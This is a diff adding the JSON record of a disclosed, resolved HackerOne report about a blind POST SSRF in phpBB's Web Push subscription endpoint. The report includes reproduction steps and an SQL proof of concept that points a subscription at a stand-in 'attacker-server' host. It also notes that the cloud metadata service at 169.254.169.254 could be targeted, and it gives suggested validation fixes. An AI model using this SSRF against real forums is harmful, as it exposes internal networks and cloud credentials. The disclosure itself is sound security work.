@@ -1,0 +1,126 @@
+{
+  "id": 3608558,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjA4NTU4",
+  "url": "https://hackerone.com/reports/3608558",
+  "title": "Blind POST SSRF via Web Push Notification Endpoint",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-16T15:17:38.177Z",
+  "submitted_at": "2026-03-16T15:17:38.475Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "misop00p",
+    "url": "/misop00p",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0wxw2jz29b71jpni2kbvdimr8woa/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8936,
+    "url": "https://hackerone.com/phpbb",
+    "handle": "phpbb",
+    "profile_picture_urls": {
+      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/qv48zkf423avl8lwrpzkjsh87o74/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22176697.png%22%3B%20filename%2A%3DUTF-8%27%27176697.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AZNQOXP%2F20260530%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260530T172548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBkaCXVzLXdlc3QtMiJHMEUCIQC2y%2BH6uxEn%2FqAEPOmnt3K%2B7ZY58r8mAF2zqB%2Bfv2yNHgIgBTMGbj9LGnCWZQozZPyWMltQkhdf7BZgpkHmo6Q0RW8qugUI4v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJsJ9w2wUhNz31ffMCqOBVJJnpcHAQdMpOHFru%2Fd8o5FtqIM1DVuDq%2FeinycnENLcv0bNDHOiXJtbtJ3RuHvMM%2F6uxt5670agRRM2pw7aA%2BDliKZWpsKxE0o8YCwKNag6x5MuNTQMM1heudqgiCfsFg7Awz1Hbr0oZgBV2emGMNNeLs0MbPwkf8Pf1QsqV3T8AK%2FmJfJ39bJnqVh%2FPXZYPZEIWQ7lc7BNux3Ml4GLleYjsBwrbFdjPcU6crsNHHJHcFugDEa1gc2CxsTXC%2FgTQWKF7YxGMAcsnRKpZ252wsCsDSVgvWjfV0zTkDCEep%2BWrS7AkVqCKwhA6hjElC1AcYWlcqrF9AvTdfquUvOHIEdPqLPSMQGib05M%2F4glPZ5TD%2B9lRVdVC5UyQRzUECSxRWUoMvLBD9pK0B9p0Rkl5cqnRpmHgfyp%2Fk5R4Qb29RWjQI6PkumFhU%2B10DVjpjf8K%2FQC%2BZVkbnngXK%2FuE8XuF9ZTP84vjGDh%2B275Q74Veh46Xi%2BQuOtgmCz8o9GIdYj9ZhGhh8yswYDRZsej2VQHxEyMeXYYUlXw6e5BchJ0Pru9ycakJSPiw%2FAygEzjaqA9pO7i6JbebdYhEN2lmbg6wRGsk2KULUkKn%2BVwrhCm%2BU2HjGAvzepbbLHpo4df%2F5cQ%2Bs6z08IluB51icrAvoNvAoYH2X7iymhrQFbnsTKtcPOcQUGj52q0cmOraI80IdtgWlVJQFDDJcNJQITA71q1j66%2BHVhvgxcTfrq%2BaVif5r7vd1ja6Vd8fOc1DmCYbCPQRDMjmXWkmShb1USqzYJKiZx0FxhEwXdYyOQVMmR0D0wwr%2FzWRfzSz%2FeWixX%2FgeuLkxR4DVrqbs8qCK1SLDqL1o%2BqiSEBuFgnUXxol2VQzDIo%2BzQBjqxATLH5WQUx1P%2Fd1eRJ4ck%2FnMvQQdX%2F66e%2BGxyeWBrRdiTphQTt70OlC8fEfmI%2B1zMPIG6nnmaG1JbxKW9omXxT3xL9%2BrzzQYVfTj5WAmIV5HPNQcwQbJCLqpnRYhqaFry43HzqIi2LNMfswduNDWEm9LsYBj58TR1p8sx2EAkup4AyfSiSgDcEzUVvs1smpYB9mJLbeZBae8zZTz1SKTk1z6Gl1VQ2xJlORW2ilA48i5kcg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=239238b97198713cb3749eccb20dcea3e07e135d00bc1989480fc5698eb12fef",
+      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/qv48zkf423avl8lwrpzkjsh87o74/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22176697.png%22%3B%20filename%2A%3DUTF-8%27%27176697.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5AZNQOXP%2F20260530%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260530T172548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBkaCXVzLXdlc3QtMiJHMEUCIQC2y%2BH6uxEn%2FqAEPOmnt3K%2B7ZY58r8mAF2zqB%2Bfv2yNHgIgBTMGbj9LGnCWZQozZPyWMltQkhdf7BZgpkHmo6Q0RW8qugUI4v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJsJ9w2wUhNz31ffMCqOBVJJnpcHAQdMpOHFru%2Fd8o5FtqIM1DVuDq%2FeinycnENLcv0bNDHOiXJtbtJ3RuHvMM%2F6uxt5670agRRM2pw7aA%2BDliKZWpsKxE0o8YCwKNag6x5MuNTQMM1heudqgiCfsFg7Awz1Hbr0oZgBV2emGMNNeLs0MbPwkf8Pf1QsqV3T8AK%2FmJfJ39bJnqVh%2FPXZYPZEIWQ7lc7BNux3Ml4GLleYjsBwrbFdjPcU6crsNHHJHcFugDEa1gc2CxsTXC%2FgTQWKF7YxGMAcsnRKpZ252wsCsDSVgvWjfV0zTkDCEep%2BWrS7AkVqCKwhA6hjElC1AcYWlcqrF9AvTdfquUvOHIEdPqLPSMQGib05M%2F4glPZ5TD%2B9lRVdVC5UyQRzUECSxRWUoMvLBD9pK0B9p0Rkl5cqnRpmHgfyp%2Fk5R4Qb29RWjQI6PkumFhU%2B10DVjpjf8K%2FQC%2BZVkbnngXK%2FuE8XuF9ZTP84vjGDh%2B275Q74Veh46Xi%2BQuOtgmCz8o9GIdYj9ZhGhh8yswYDRZsej2VQHxEyMeXYYUlXw6e5BchJ0Pru9ycakJSPiw%2FAygEzjaqA9pO7i6JbebdYhEN2lmbg6wRGsk2KULUkKn%2BVwrhCm%2BU2HjGAvzepbbLHpo4df%2F5cQ%2Bs6z08IluB51icrAvoNvAoYH2X7iymhrQFbnsTKtcPOcQUGj52q0cmOraI80IdtgWlVJQFDDJcNJQITA71q1j66%2BHVhvgxcTfrq%2BaVif5r7vd1ja6Vd8fOc1DmCYbCPQRDMjmXWkmShb1USqzYJKiZx0FxhEwXdYyOQVMmR0D0wwr%2FzWRfzSz%2FeWixX%2FgeuLkxR4DVrqbs8qCK1SLDqL1o%2BqiSEBuFgnUXxol2VQzDIo%2BzQBjqxATLH5WQUx1P%2Fd1eRJ4ck%2FnMvQQdX%2F66e%2BGxyeWBrRdiTphQTt70OlC8fEfmI%2B1zMPIG6nnmaG1JbxKW9omXxT3xL9%2BrzzQYVfTj5WAmIV5HPNQcwQbJCLqpnRYhqaFry43HzqIi2LNMfswduNDWEm9LsYBj58TR1p8sx2EAkup4AyfSiSgDcEzUVvs1smpYB9mJLbeZBae8zZTz1SKTk1z6Gl1VQ2xJlORW2ilA48i5kcg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2b0bd2616ec7830606fe5edf840988e86d08afbf09b239856259e74bb063b0e6"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "phpBB",
+      "twitter_handle": "phpbb",
+      "website": "https://www.phpbb.com",
+      "about": "phpBB is the world's most popular free and open source forum software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-05-30T16:47:37.236Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-04-30T16:47:31.344Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nA registered user can register an arbitrary URL as their Web Push notification endpoint. phpBB stores this URL without validation and later uses the Minishlink WebPush library to send HTTP POST requests to it. This allows the attacker to force the phpBB server to make outbound HTTP requests to internal network services, cloud metadata endpoints, or other attacker-controlled destinations.\n\nThis is the same class of vulnerability as [HackerOne #1018568](https://hackerone.com/reports/1018568) (SSRF in Jabber settings), but requires only a **registered user** rather than admin access. The Jabber feature was removed in phpBB 4.0 via migration; Web Push was added as its replacement.\n\n## Severity\nMedium — CVSS 3.1: 5.0 (AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N)\n\n## Affected Version\nphpBB 4.0.0-alpha1 (commit 4a57f1ff3c)\n\n## Prerequisites\n- Web Push notifications enabled by admin (`webpush_enable=1` + VAPID keys configured)\n- `webpush_enable` defaults to `false` on fresh install but `webpush_method_default_enable` defaults to `true`, meaning once an admin enables it, all users have it active\n- Attacker has a registered user account\n\n## Steps to Reproduce\n\n### 1. Setup\nEnable Web Push in ACP → Board settings → set VAPID keys. Or via DB:\n```sql\nUPDATE phpbb_config SET config_value = '1' WHERE config_name = 'webpush_enable';\n-- Generate and set VAPID keys via Minishlink\\WebPush\\VAPID::createVapidKeys()\n```\n\n### 2. Register malicious push endpoint\nAs a registered user, subscribe to Web Push notifications via the browser. Intercept the subscription request to `/user/push/subscribe` and replace the `endpoint` field with an internal URL. The attacker must supply valid P-256 ECDH keys (trivially generated).\n\nThe endpoint is stored at `webpush.php:321-327`:\n```php\n$sql = 'INSERT INTO ' . $this->push_subscriptions_table . ' '\n    . $this->db->sql_build_array('INSERT', [\n    'user_id'   => $this->user->id(),\n    'endpoint'  => $data['endpoint'],  // ← no URL validation\n    // ...\n]);\n```\n\n### 3. Trigger a notification\nAny event that generates a notification for the attacker (another user replies to their topic, quotes their post, sends them a PM, etc.).\n\n### 4. Server makes outbound request\nThe notification method at `notification/method/webpush.php:248-255` reads the endpoint from the database and sends an HTTP POST via Guzzle:\n```php\n$push_subscription = Subscription::create([\n    'endpoint' => $subscription['endpoint'],  // from DB, unvalidated\n]);\n$web_push->queueNotification($push_subscription, $json_data);\n```\n\n## Proof of Concept — Live Verified\n\nTested on phpBB 4.0.0-alpha1 in Docker (PHP 8.2 + MySQL 8.0):\n\n1. Inserted malicious subscription:\n```sql\nINSERT INTO phpbb_push_subscriptions (user_id, endpoint, p256dh, auth)\nVALUES (2, 'http://attacker-server:9999/ssrf-poc', '<valid_p256dh>', '<valid_auth>');\n```\n\n2. Triggered notification via `$notification_manager->add_notifications()`\n\n3. Attacker's HTTP listener received:\n```\nPOST /ssrf-poc HTTP/1.1\nHost: attacker-server:9999\nUser-Agent: GuzzleHttp/7\nContent-Type: application/octet-stream\nContent-Encoding: aesgcm\nAuthorization: WebPush TOKEN...\nContent-Length: 3070\n```\n\nThe phpBB server sent a full Web Push protocol request (encrypted payload, VAPID JWT, ECDH headers) to the attacker-controlled URL.\n\n## Impact\n\n## Impact\n- **Blind POST SSRF**: the server sends HTTP POST requests to arbitrary URLs. The attacker does not see the response body, but can observe timing, connection success/failure, and response status via the phpBB admin log.\n- **Internal network probing**: port scanning and service discovery of hosts reachable from the phpBB server but not from the internet.\n- **Cloud metadata access**: on cloud-hosted instances, requests to `http://169.254.169.254/` can reach the instance metadata service. AWS IMDSv1 responds to POST requests, potentially leaking IAM credentials.\n- **Internal service interaction**: POST requests with a non-empty body (3KB encrypted payload) are sent to the target, which could trigger actions on internal POST-accepting services.\n\n## Root Cause\n`webpush.php:subscribe()` stores the user-supplied `endpoint` URL directly in the database without any validation. The W3C Push API specification defines that endpoints should be URLs of push services (e.g., `fcm.googleapis.com`, `push.services.mozilla.com`), but phpBB does not enforce this.\n\n## Suggested Fix\nValidate the endpoint URL before storing:\n```php\n// Option A: Allowlist of known push service domains\n$allowed_hosts = ['fcm.googleapis.com', 'push.services.mozilla.com',\n                  'notify.windows.com', 'web.push.apple.com'];\n$parsed = parse_url($data['endpoint']);\nif (!$parsed || $parsed['scheme'] !== 'https' ||\n    !in_array($parsed['host'], $allowed_hosts) &&\n    !str_ends_with($parsed['host'], '.notify.windows.com')) {\n    throw new http_exception(400, 'INVALID_PUSH_ENDPOINT');\n}\n\n// Option B: At minimum, reject private/internal IPs\n$host = parse_url($data['endpoint'], PHP_URL_HOST);\n$ip = gethostbyname($host);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    throw new http_exception(400, 'INVALID_PUSH_ENDPOINT');\n}\n```",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-05-30T16:47:31.804Z",
+  "allow_singular_disclosure_after": -2296.346400444,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "misop00p"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 12184,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/phpbb/phpbb",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
